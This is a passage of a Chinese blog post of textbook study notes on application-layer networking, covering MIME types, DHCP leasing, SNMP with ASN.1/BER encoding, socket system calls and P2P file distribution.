编码表示的字符串。可用于二进制和非文本数据的编码。</td></tr><tr><td>Quoted-printable</td><td>将任意长度的字节串转换为  ASCII  编码表示的字符串。可用于二进制和非文本数据的编码。</td></tr></tbody></table></li></ol><p>这里对各个编码方法就不继续展开了，详细可以通过书本理解</p><h3 id="内容类型"><a href="#内容类型" class="headerlink" title="内容类型"></a>内容类型</h3><p>MIME 着标准规定 Content-Type 说明必须含有两个标识符，即内容类型(type)和子类型(subtype)，中间用“/”分开。 </p><p>MIME 标准原先定义了 7 个基本内容类型和 15 种子类型。</p><p>MIME允许发件人和收件人自己定义专用的内容类型。但为避免可能出现名字冲突，标准要求为专用的内容类型选择的名字要以字符串 X-开始。</p><table><thead><tr><th>内容类型</th><th>子类型举例</th><th>说明</th></tr></thead><tbody><tr><td>text（文本）</td><td>plain, html, xml, css</td><td>不同格式的文本</td></tr><tr><td>image（图像）</td><td>gif, jpeg, tiff</td><td>不同格式的静止图像</td></tr><tr><td>audio（音频）</td><td>basic, mpeg, mp4</td><td>可听见的声音</td></tr><tr><td>video（视频）</td><td>mpeg, mp4, quicktime</td><td>不同格式的影片</td></tr><tr><td>model（模型）</td><td>vrml</td><td>3D模型</td></tr><tr><td>application（应用）</td><td>octet-stream, pdf,  javascript, zip</td><td>不同应用程序产生的数据</td></tr><tr><td>message（报文）</td><td>http, rfc822</td><td>封装的报文</td></tr><tr><td>multipart（多部分）</td><td>mixed, alternative, parallel, digest</td><td>多种类型的组合</td></tr></tbody></table><p>举个例子</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409110200263.png" alt="image-20210409110200263"></p><h1 id="动态主机配置协议-DHCP"><a href="#动态主机配置协议-DHCP" class="headerlink" title="动态主机配置协议 DHCP"></a>动态主机配置协议 DHCP</h1><p>互联网广泛使用的动态主机配置协议 DHCP (Dynamic Host Configuration Protocol) 提供了即插即用连网 (plug-and-play networking) 的机制。</p><p>这种机制允许一台计算机加入新的网络和获取 IP 地址，而不用手工配置。</p><p>DHCP给运行服务器软件、且位置固定的计算机指派一个永久地址，给运行客户端软件的计算机分配一个临时地址。</p><p>步骤大致如下</p><ol><li><p>需要 IP 地址的主机在启动时就向 DHCP 服务器广播发送发现报文（DHCPDISCOVER），这时该主机就成为 DHCP 客户。</p><p>为什么要广播，因为这时候A并不知道DHCP服务器是哪一台，所以全都发，而此时它并没有IP地址，所以这个报文的源地址也都会是0</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409111807042.png" alt="image-20210409111807042"></p></li><li><p>本地网络上所有主机都能收到此广播报文，但只有 DHCP 服务器才回答此广播报文。</p></li><li><p>DHCP 服务器先在其数据库中查找该计算机的配置信息。</p><ul><li>若找到，则返回找到的信息。</li><li>若找不到，则从服务器的 IP 地址池 (address pool) 中取一个地址分配给该计算机。DHCP服务器的回答报文叫做提供报文（DHCPOFFER）。</li></ul><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409111829348.png" alt="image-20210409111829348"></p></li></ol><p>并不是每个网络上都有DHCP服务器，这样会使DHCP服务器的数量太多。现在是每一个网络至少有一个 DHCP 中继代理，它配置了 DHCP 服务器的 IP 地址信息。</p><p>当 DHCP 中继代理收到主机发送的发现报文后，就以单播方式向 DHCP 服务器转发此报文，并等待其回答。收到 DHCP 服务器回答的提供报文后，DHCP 中继代理再将此提供报文发回给主机。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409111903379.png" alt="image-20210409111903379"></p><h2 id="租用期-lease-period"><a href="#租用期-lease-period" class="headerlink" title="租用期 (lease period)"></a>租用期 (lease period)</h2><p>DHCP 服务器分配给 DHCP 客户的 IP 地址的<strong>临时的</strong>，因此 DHCP 客户只能在一段有限的时间内使用这个分配到的 IP 地址。DHCP 协议称这段时间为<strong>租用期</strong>。<br>租用期的数值应由 DHCP 服务器自己决定。<br>DHCP 客户也可在自己发送的报文中（例如，发现报文）提出对租用期的要求。 </p><p>不是很理解为啥要租用，不能分配好了就一直用吗，可能是因为怕使用了该ip地址的主机很久不用导致ip地址浪费吧</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409112048314.png" alt="image-20210409112048314"></p><p>梳理图中的过程</p><ol><li><p>DHCP 服务器被动打开 UDP 端口 67， 等待客户端发来的报文。</p></li><li><p>DHCP 客户从 UDP 端口 68 发送 DHCP 发现报文 DHCPDISCOVER。</p></li><li><p>凡收到 DHCP 发现报文的 DHCP 服务器都发出 DHCP 提供报文 DHCPOFFER，因此，DHCP 客户可能收到多个 DHCP 提供报文 。</p></li><li><p>DHCP 客户从几个 DHCP 服务器中选择其中的一个，并向所选择的 DHCP 服务器发送 DHCP 请求报文 DHCPREQUEST。</p></li><li><p>被选择的 DHCP 服务器发送确认报文DHCPACK，进入已绑定状态，并可开始使用得到的临时 IP 地址了。</p><p>DHCP 客户现在要根据服务器提供的租用期 T 设置两个计时器 T1 和 T2，它们的超时时间分别是 0.5T 和 0.875T。当超时时间到就要请求更新租用期。</p></li><li><p>租用期过了一半（T1 时间到），DHCP 客户发送请求报文 DHCPREQUEST，要求更新租用期。 </p></li><li><p>DHCP 服务器若同意，则发回确认报文 DHCPACK。DHCP 客户得到了新的租用期，重新设置计时器。</p></li><li><p>DHCP 服务器若不同意，则发回否认报 DHCPNACK。这时 DHCP 客户必须立即停止使用原来的 IP 地址，而必须重新申请 IP 地址（回到步骤  ❷）。</p><p>若 DHCP 服务器不响应步骤  ❻ 的请求报文 DHCPREQUEST，则在租用期过了 87.5% 时，DHCP 客户必须重新发送请求报文 DHCPREQUEST（重复步骤  ❻），然后又继续后面的步骤。 </p></li><li><p>DHCP 客户可随时提前终止服务器所提供的租用期，这时只需向 DHCP 服务器发送释放报文 DHCPRELEASE 即可。</p></li></ol><h1 id="简单网络管理协议-SNMP"><a href="#简单网络管理协议-SNMP" class="headerlink" title="简单网络管理协议 SNMP"></a>简单网络管理协议 SNMP</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><blockquote><p>网络管理包括对硬件、软件和人力的使用、综合与协调，以便对网络资源进行监视、测试、配置、分析、评价和控制，这样就能以合理的价格满足网络的一些需求，如实时运行性能，服务质量等。网络管理常简称为网管。</p></blockquote><p>网络管理并不是指对网络进行行政上的管理。网络管理分为五大功能</p><ol><li>故障管理：故障检测、隔离和纠正。</li><li>配置管理：初始化网络、并配置网络。</li><li>计费管理：记录网络资源的使用。</li><li>性能管理：估价系统资源的运行状况及通信效率等。</li><li>网络安全管理：对授权机制、访问控制、加密和加密关键字的管理。</li></ol><p>网络管理长这样的</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409113609272.png" alt="image-20210409113609272"></p><ul><li>管理站也常称为网络运行中心 NOC (Network Operations Center)，是网络管理系统的核心。</li><li>管理程序在运行时就成为管理进程。</li><li>管理站（硬件）或管理程序（软件）都可称为管理者(manager)。Manager 不是指人，而是指机器或软件。</li><li>网络管理员 (administrator) 指的是负责网络管理的人员。</li><li>大型网络往往实行多级管理，因而有多个管理者，而一个管理者一般只管理本地网络的设备。</li><li>被管对象<ul><li>网络的每一个被管设备中可能有多个被管对象。</li><li>被管设备有时可称为网络元素或网元。</li><li>在被管设备中也会有一些不能被管的对象。 </li></ul></li></ul><h3 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h3><p>在每一个被管设备中都要运行一个程序以便和管理站中的管理程序进行通信。这些运行着的程序叫做网络管理代理程序，或简称为代理。</p><p>代理程序在管理程序的命令和控制下在被管设备上采取本地的行动。</p><h3 id="网络管理协议"><a href="#网络管理协议" class="headerlink" title="网络管理协议"></a>网络管理协议</h3><p>网络管理协议简称为网管协议。</p><p>网络管理协议是管理程序和代理程序之间进行通信的规则。</p><p>网络管理员利用网络管理协议，通过管理站对网络中的被管设备进行管理。 </p><p>需要注意的是，网管协议本身不管理网络。</p><h3 id="简单网络管理协议-SNMP-1"><a href="#简单网络管理协议-SNMP-1" class="headerlink" title="简单网络管理协议 SNMP"></a>简单网络管理协议 SNMP</h3><p>简单网络管理协议SNMP (Simple Network Management Protocol) 中的管理程序和代理程序按客户–服务器方式工作。</p><p>管理程序运行 SNMP 客户程序，向某个代理程序发出请求（或命令），代理程序运行 SNMP 服务器程序，返回响应（或执行某个动作）。</p><p>在网管系统中，往往是一个（或少数几个）客户程序与很多的服务器程序进行交互。</p><h4 id="指导思想"><a href="#指导思想" class="headerlink" title="指导思想"></a>指导思想</h4><ul><li>SNMP 最重要的指导思想就是要尽可能简单。</li><li>SNMP 的基本功能包括监视网络性能、检测分析网络差错和配置网络设备等。</li><li>在网络正常工作时，SNMP 可实现统计、配置、和测试等功能。当网络出故障时，可实现各种差错检测和恢复功能。</li><li>虽然 SNMP 是在 TCP/IP 基础上的网络管理协议，但也可扩展到其他类型的网络设备上。 </li></ul><h4 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h4><ol><li>监视网络性能</li><li>检测分析网络差错</li><li>配置网络设备等。</li></ol><h3 id="委托代理"><a href="#委托代理" class="headerlink" title="委托代理"></a>委托代理</h3><p>整个系统必须有一个管理站。</p><p>若网络元素使用的不是 SNMP 而是另一种网络管理协议，SNMP 协议就无法控制该网络元素。这时可使用委托代理 (proxy agent)。</p><p>委托代理能提供协议转换和过滤操作等功能，对被管对象进行管理。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409114208398.png" alt="image-20210409114208398"></p><h3 id="SNMP-的网络管理组成"><a href="#SNMP-的网络管理组成" class="headerlink" title="SNMP 的网络管理组成"></a>SNMP 的网络管理组成</h3><ol><li>SNMP 本身</li><li>管理信息结构 SMI (Structure of Management Information)</li><li>管理信息库 MIB (Management Information Base)。</li></ol><h2 id="管理信息结构-SMI"><a href="#管理信息结构-SMI" class="headerlink" title="管理信息结构 SMI"></a>管理信息结构 SMI</h2><blockquote><p>功能：</p><ol><li>被管对象应怎样命名；</li><li>用来存储被管对象的数据类型有哪些；</li><li>在网络上传送的管理数据应如何编码。 </li></ol></blockquote><p>SMI 定义了命名对象和定义对象类型（包括范围和长度）的通用规则，以及把对象和对象的值进行编码的规则。这样做是为了确保网络管理数据的语法和语义的无二义性。但从 SMI 的名称并不能看出它的功能。SMI 并不定义一个实体应管理的对象数目，也不定义被管对象名以及对象名及其值之间的关联。 </p><p>首先从第一个功能，被管对象的命名上来讲</p><h3 id="被管对象命名"><a href="#被管对象命名" class="headerlink" title="被管对象命名"></a>被管对象命名</h3><p><strong>SMI 规定所有被管对象必须在命名树上</strong>，如下图</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210411101957301.png" alt="image-20210411101957301"></p><p>SMI 标准指明：所有的 MIB 变量必须使用抽象语法记法 1（ASN.1）来定义。<br>SMI 既是 ASN.1 的子集，又是 ASN.1 的超集。<br>ASN.1 的记法很严格，它使得数据的含义不存在任何可能的二义性。</p><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210411102208973.png" alt="image-20210411102208973"></p><p>SMI 把数据类型分为两大类（如下图）：</p><ol><li>简单类型</li><li>结构化类型。 </li></ol><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210411102306749.png" alt="image-20210411102306749"></p><h3 id="基本编码规则-BER"><a href="#基本编码规则-BER" class="headerlink" title="基本编码规则 BER"></a>基本编码规则 BER</h3><p>ISO 在制订 ASN.1 语言的同时也为它定义了一种标准的编码方案，即基本编码规则 BER (Basic Encoding Rule)。<br>BER 指明了每种数据类型中每个数据的值的表示。<br>发送端用 BER 编码，可将用 ASN.1 所表述的报文转换成唯一的比特序列。<br>接收端用 BER 进行解码，得到该比特序列所表示的 ASN.1 报文。 </p><p> ASN.1把所有的数据元素都表示为T-L-V三个字段的组成的序列，T字段定义数据的类型，L字段定义V字段的长度，V字段定义数据值</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210411102353190.png" alt="image-20210411102353190"></p><p><strong>TLV 中的 T 字段定义数据的类型</strong></p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210411102504033.png" alt="image-20210411102504033"></p><p><strong>L 字段定义 V 字段的长度</strong></p><p>单字节的L字段第一位为0，后续七位定义V字段的长度</p><p>当L字段为多字节时，其最高为时1，后面七位定义后续字节的字节数（二进制整数表示），这时，所有后续字节并置起来的二进制整数定义V字段的长度</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210411102742467.png" alt="image-20210411102742467"></p><p><strong>V 字段定义数据的值</strong></p><table><thead><tr><th>类   型</th><th>大   小</th><th>说      明</th></tr></thead><tbody><tr><td>INTEGER</td><td>4 字节</td><td>在 –231 到  231  – 1  之间的整数</td></tr><tr><td>Interger32</td><td>4 字节</td><td>和 INTEGER  相同</td></tr><tr><td>Unsigned32</td><td>4 字节</td><td>在 0  到  232  – 1  之间的无符号数</td></tr><tr><td>OCTET  STRING</td><td>可变</td><td>不超过  65535 字节长的字节串</td></tr><tr><td>OBJECT  IDENTIFIER</td><td>可变</td><td>对象标识符</td></tr><tr><td>IPAddress</td><td>4 字节</td><td>由 4  个整数组成的IP地址</td></tr><tr><td>Counter32</td><td>4 字节</td><td>可从  0 增加到 232 的整数；当它到达最大值时就返回到  0</td></tr><tr><td>TimeTicks</td><td>4 字节</td><td>记录时间的计数值，以  1/100 秒为单位</td></tr><tr><td>BITS</td><td>—</td><td>比特串</td></tr><tr><td>Opaque</td><td>可变</td><td>不解释的串</td></tr></tbody></table><p>例如，INTEGER 15，其 T 字段是02， INTEGER 类型要用 4 字节编码。最后得出 TLV 编码为 02 04 00 00 00 0F。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210411104028469.png" alt="image-20210411104028469"></p><p> V 字段<strong>可嵌套</strong>其他数据元素的 TLV 字段</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210411103814658.png" alt="image-20210411103814658"></p><h2 id="管理信息库-MIB"><a href="#管理信息库-MIB" class="headerlink" title="管理信息库 MIB"></a>管理信息库 MIB</h2><p>被管对象必须维持可供管理程序读写的若干控制和状态信息。这些信息总称为管理信息库  MIB (Management Information Base) 。<br>管理程序使用 MIB 中这些信息的值对网络进行管理（如读取或重新设置这些值）。<br>只有在 MIB 中的对象才是 SNMP 所能够管理的。</p><p><strong>节点 mib-2 所包含的信息类别举例</strong></p><table><thead><tr><th>类  别</th><th>标 号</th><th>所包含的信息</th></tr></thead><tbody><tr><td>system</td><td>(1)</td><td>主机或路由器的操作系统</td></tr><tr><td>interfaces</td><td>(2)</td><td>各种网络接口</td></tr><tr><td>address  translation</td><td>(3)</td><td>地址转换（例如，ARP 映射）</td></tr><tr><td>ip</td><td>(4)</td><td>IP 软件</td></tr><tr><td>icmp</td><td>(5)</td><td>ICMP  软件</td></tr><tr><td>tcp</td><td>(6)</td><td>TCP  软件</td></tr><tr><td>udp</td><td>(7)</td><td>UDP  软件</td></tr><tr><td>egp</td><td>(8)</td><td>EGP  软件</td></tr></tbody></table><p>MIB <strong>变量的例子</strong></p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210411104236265.png" alt="image-20210411104236265"></p><h2 id="SNMP-的协议数据单元和报文"><a href="#SNMP-的协议数据单元和报文" class="headerlink" title="SNMP 的协议数据单元和报文"></a>SNMP 的协议数据单元和报文</h2><p>SNMP 的操作只有两种基本的管理功能：</p><ol><li>“读”操作，用 get 报文来检测各被管对象的状况；</li><li>“写”操作，用 set 报文来改变各被管对象的状况。</li></ol><p>SNMP 的这些功能通过探询操作来实现。</p><h3 id="探寻操作"><a href="#探寻操作" class="headerlink" title="探寻操作"></a>探寻操作</h3><blockquote><p>探询操作 —— SNMP 管理进程定时向被管理设备周期性地发送探询信息。</p></blockquote><p>探询的好处：</p><ol><li>可使系统相对简单。</li><li>能限制通过网络所产生的管理信息的通信量。</li></ol><p>探询的缺点：</p><ol><li>不够灵活，而且所能管理的设备数目不能太多。</li><li>开销也较大。</li></ol><h3 id="陷阱"><a href="#陷阱" class="headerlink" title="陷阱"></a>陷阱</h3><p><strong>SNMP 不是完全的探询协议，它允许不经过询问就能发送某些信息。这种信息称为陷阱，表示它能够捕捉“事件”。</strong></p><p>当被管对象的代理检测到有事件发生时，就检查其门限值。代理只向管理进程报告达到某些门限值的事件（即过滤）。</p><p>过滤的好处是：</p><ol><li>仅在严重事件发生时才发送陷阱；</li><li>陷阱信息很简单且所需字节数很少。 </li></ol><p>使用探询（至少是周期性地）以维持对网络资源的实时监视。<br>同时也采用陷阱机制报告特殊事件，使得 SNMP 成为一种有效的网络管理协议。 </p><h3 id="SNMP-使用无连接的-UDP"><a href="#SNMP-使用无连接的-UDP" class="headerlink" title="SNMP 使用无连接的 UDP"></a>SNMP 使用无连接的 UDP</h3><p>SNMP 使用无连接的 UDP。但 UDP 不保证可靠交付。</p><p>在运行代理程序的服务器端用熟知端口 161 来接收 get 或 set 报文和发送响应报文（与熟知端口通信的客户端使用临时端口）。<br>运行管理程序的客户端则使用熟知端口 162 来接收来自各代理的 trap 报文。 </p><h3 id="SNMPv1-定义的协议数据单元-PDU-类型"><a href="#SNMPv1-定义的协议数据单元-PDU-类型" class="headerlink" title="SNMPv1 定义的协议数据单元 (PDU) 类型"></a>SNMPv1 定义的协议数据单元 (PDU) 类型</h3><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210411104738807.png" alt="image-20210411104738807"></p><h3 id="SNMP-的报文格式"><a href="#SNMP-的报文格式" class="headerlink" title="SNMP 的报文格式"></a>SNMP 的报文格式</h3><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210411104820927.png" alt="image-20210411104820927"></p><h3 id="Get-request-报文-ASN-1-编码"><a href="#Get-request-报文-ASN-1-编码" class="headerlink" title="Get-request 报文 ASN.1 编码"></a>Get-request 报文 ASN.1 编码</h3><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210411104856701.png" alt="image-20210411104856701"></p><p>ASN.1 定义</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210411104933471.png" alt="image-20210411104933471"></p><h3 id="Get-request-报文的-BER-编码"><a href="#Get-request-报文的-BER-编码" class="headerlink" title="Get-request 报文的 BER 编码"></a>Get-request 报文的 BER 编码</h3><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210411104957973.png" alt="image-20210411104957973"></p><p>BER 编码</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210411105021274.png" alt="image-20210411105021274"></p><h1 id="应用进程跨越网络的通信"><a href="#应用进程跨越网络的通信" class="headerlink" title="应用进程跨越网络的通信"></a>应用进程跨越网络的通信</h1><h2 id="系统调用和应用编程接口"><a href="#系统调用和应用编程接口" class="headerlink" title="系统调用和应用编程接口"></a>系统调用和应用编程接口</h2><p>大多数操作系统使用系统调用 (system call ) 的机制在应用程序和操作系统之间传递控制权。</p><p>对程序员来说，每一个系统调用和一般程序设计中的函数调用非常相似，只是系统调用是<strong>将控制权传递给了操作系统</strong>。 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409144949026.png" alt="image-20210409144949026"></p><h3 id="应用编程接口-API"><a href="#应用编程接口-API" class="headerlink" title="应用编程接口 API"></a>应用编程接口 API</h3><p>系统调用接口实际上就是应用进程的控制权和操作系统的控制权进行转换的一个接口。</p><p>使用系统调用之前要编写一些程序，特别是需要设置系统调用中的许多参数，因此这种系统调用接口又称为应用编程接口 API (Application Programming Interface) 。</p><h2 id="几种常用的系统调用"><a href="#几种常用的系统调用" class="headerlink" title="几种常用的系统调用"></a>几种常用的系统调用</h2><p>Berkeley UNIX 操作系统定义了一种 API，它又称为<strong>套接字接口 (socket interface)</strong>。</p><p>微软公司在其操作系统中采用了套接字接口  API，形成了一个稍有不同的 API，并称之为  Windows Socket。</p><p>AT&amp;T 为其 UNIX 系统 V 定义了一种 API，简写为 TLI (Transport Layer Interface)。 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409145218013.png" alt="image-20210409145218013"></p><h3 id="套接字特点及使用"><a href="#套接字特点及使用" class="headerlink" title="套接字特点及使用"></a>套接字特点及使用</h3><p>当应用进程需要使用网络进行通信时就发出系统调用，请求操作系统为其创建“套接字”，以便把网络通信所需要的系统资源分配给该应用进程。</p><p>操作系统为这些资源的总和用一个叫做套接字描述符的号码来表示。</p><p>应用进程所进行的网络操作都必须使用这个套接字描述符。<br>通信完毕后，应用进程通过一个关闭套接字的系统调用通知操作系统回收与该套接字描述符相关的所有资源。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409145449361.png" alt="image-20210409145449361"></p><p>下面来讲一下如何通过套接字来调用TCP 提供面向连接的服务</p><p>总共分为三个阶段，和运输层的tcp三报文握手类似，结合图理解该过程</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409151143953.png" alt="image-20210409151143953"></p><ol><li><p><strong>连接建立阶段</strong></p><p>当套接字被创建后，它的端口号和 IP 地址都是空的，因此应用进程要<strong>调用 bind</strong>（绑定）来指明套接字的本地地址。在服务器端调用 bind 时就是把熟知端口号和本地 IP 地址填写到已创建的套接字中。这就叫做把本地地址绑定到套接字。</p><p>服务器在调用 bind 后，还必须<strong>调用 listen</strong>（收听）把套接字设置为被动方式，以便随时接受客户的服务请求。<strong>UDP 服务器由于只提供无连接服务，不使用 listen 系统调用。</strong></p><p>服务器紧接着就<strong>调用 accept（接受）</strong>，以便把远地客户进程发来的连接请求提取出来。系统调用 accept 的一个变量就是要指明从哪一个套接字发起的连接。 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409151632523.png" alt="image-20210409151632523"></p></li><li><p><strong>数据传送阶段</strong></p><p>客户和服务器都在 TCP 连接上使用 <strong>send 系统调用传送数据</strong>，使用 <strong>recv 系统调用接收数据</strong>。</p><p>通常客户使用 send 发送请求，而服务器使用 send 发送回答。<br>服务器使用 recv 接收客户用 send 调用发送的请求。客户在发完请求后用 recv 接收回答。</p></li><li><p><strong>连接释放阶段</strong></p><p>一旦客户或服务器结束使用套接字，就把套接字撤消。这时就调用 <strong>close 释放连接</strong>和<strong>撤销套接字</strong>。</p></li></ol><h1 id="P2P-应用"><a href="#P2P-应用" class="headerlink" title="P2P 应用"></a>P2P 应用</h1><h2 id="具有集中目录服务器的-P2P-工作方式"><a href="#具有集中目录服务器的-P2P-工作方式" class="headerlink" title="具有集中目录服务器的 P2P 工作方式"></a>具有集中目录服务器的 P2P 工作方式</h2><p>在 P2P 工作方式下，所有的音频/视频文件都是在普通的互联网用户之间传输。</p><p>这种工作方式解决了集中式媒体服务器可能出现的瓶颈问题。</p><p>在互联网流量中，P2P 工作方式下的文件分发已占据了最大的份额，比万维网应用所占的比例大得多</p><p>世界上最早使用P2P方式的是<strong>Napster</strong>，Napster 将所有音乐文件的索引信息都集中存放在 Napster 目录服务器中。使用者只要查找目录服务器，就可知道应从何处下载所要的MP3文件。用户要及时向 Napster 的目录服务器报告自己存有的音乐文件。Napster 的文件传输是分散的，文件的定位则是集中的。</p><p>让我们通过一张图理解该过程</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409155704154.png" alt="image-20210409155704154"></p><ol><li>用户 X 向 Napster 目录服务器查询（客户–服务器方式）谁有音乐文件 MP3#。</li><li>Napster 目录服务器回答 X：有三个地点有文件 MP3#，即 A, B 和 C（给出了这三个地点的IP地址）。于是用户 X 得知所需的文件 MP3# 的三个下载地点。</li><li>用户 X 可以随机地选择三个地点中的任一个。假定 X 向 A 发送下载文件 MP3#的请求报文。双方都使用 P2P 方式通信。</li><li>对等方A（现在作为服务器）把文件MP3#发送给X。</li></ol><p><strong>集中式目录服务器同样也存在问题：可靠性差。会成为性能的瓶颈。</strong></p><h2 id="具有全分布式结构的-P2P-文件共享程序"><a href="#具有全分布式结构的-P2P-文件共享程序" class="headerlink" title="具有全分布式结构的 P2P 文件共享程序"></a>具有全分布式结构的 P2P 文件共享程序</h2><h3 id="Gnutella"><a href="#Gnutella" class="headerlink" title="Gnutella"></a>Gnutella</h3><p>Gnutella 是第二代 P2P 文件共享程序，采用<strong>全分布方法</strong>定位内容的 P2P 文件共享应用程序。 </p><p>Gnutella 与 Napster 最大的区别是：不使用集中式的目录服务器，而是使用<strong>洪泛法</strong>在大量 Gnutella <strong>用户之间进行查询</strong>。</p><p>为了不使查询的通信量过大，Gnutella 设计了一种<strong>有限范围的洪泛查询</strong>，以减少<strong>倾注到互联网的查询流量</strong>，但也<strong>影响到查询定位的准确性</strong>。 </p><h3 id="eMule"><a href="#eMule" class="headerlink" title="eMule"></a>eMule</h3><p>eMule 使用了一些服务器。这些服务器并不是保存音频/视频文件，而是保存用户的有关信息，因而可以告诉用户从哪些地方可以下载到所需的文件。</p><p>eMule 使用了专门定义的文件夹，让用户存放可以和其他用户共享的文件。</p><p>eMule 的下载文件规则是鼓励用户向其他用户上传文件。用户上传文件越多，其下载文件的优先级就越高（因而下载就越快）。</p><h3 id="BitTorrent"><a href="#BitTorrent" class="headerlink" title="BitTorrent"></a>BitTorrent</h3><p>BitTorrent 所有对等方集合称为一个洪流 (torrent)，下载文件的数据单元为长度固定的文件块 (chunk)。基础设施结点，叫做追踪器 (tracker)。</p><p>A 就和这些对等方建立了 TCP 连接。所有与 A 建立了 TCP 连接的对等方为“相邻对等方”(neighboring peers)。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409161511009.png" alt="image-20210409161511009"></p><p>在请求的过程中，A 使用最稀有的优先 (rarest first) 的技术，首先向其相邻对等方请求对应的文件块。<br>所谓稀有是指：如果A所缺少的文件块在相邻对等方中的副本很少，那就是“很稀有的”。</p><p>而当很多对等方需要请求文件块时，A如何决定先向谁提供呢？<br>凡当前以最高数据率向 A 传送文件块的某相邻对等方，A 就优先把所请求的文件块传送给该相邻对等方（原来计算机也这么现实）</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409161524959.png" alt="image-20210409161524959"></p><p>从互联网传送数据到主机，叫做<strong>下载 (download)</strong>，从主机向互联网传送，则称为<strong>上传 (upload) 或上载</strong>。</p><h2 id="P2P-文件分发的分析"><a href="#P2P-文件分发的分析" class="headerlink" title="P2P 文件分发的分析"></a>P2P 文件分发的分析</h2><p>让我们来分析下传统的客户-服务器方式下进行数据请求的过程（结合图中的变量名）</p><p>有 N 台主机从服务器下载一个大文件，其长度为 F bit。假定主机与互联网连接的链路的上传速率和下载速率分别为 ui 和 di ，单位都是 bit/s。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E5%BA%94%E7%94%A8%E5%B1%82/image-20210409161917270.png" alt="image-20210409161917270"></p><p>从服务器端考虑，所有主机分发完毕的最短时间 Tcs 不可能小于 NF/us （每次都要建立连接）；<br>下载速率最慢的主机的下载速率为 dmin，则 Tcs 不可能小于 F/dmin  。<br>由此可得出所有主机都下载完文件 F 的最少时间是：</p><blockquote><p>Tcs = max（ NF/us，F/dmin ）</p></blockquote><p>而在P2P下的最短时间呢</p><p>初始服务器文件分发的最少时间不可能小于 F/us （只需要上传一次）；<br>下载文件分发的最少时间不可能小于 F/dmin ；<br>上载文件分发的最少时间不可能小于 NF/uT ，其中是 uT  是上传速率之和。<br>所有主机都下载完文件 F 的最少时间的下限是：<br>Tp2p &gt;= max（ F/us ， F/dmin， NF/uT  ）</p><p><strong>举个栗子比较一下</strong>（好吧其实书里这个例子我没法理解，0.75怎么得出来的搞不懂）</p><p>设所有的对等方的上传速率都是 u，并且 F/u = 1 小时。<br>设服务器的上传速率 us = 10u。<br>当 N = 30 时，<br>P2P方式：最少时间的下限是 0.75 小时 &lt; 1 小时（不管 N 多大）。<br>客户−服务器方式：最少时间是 3 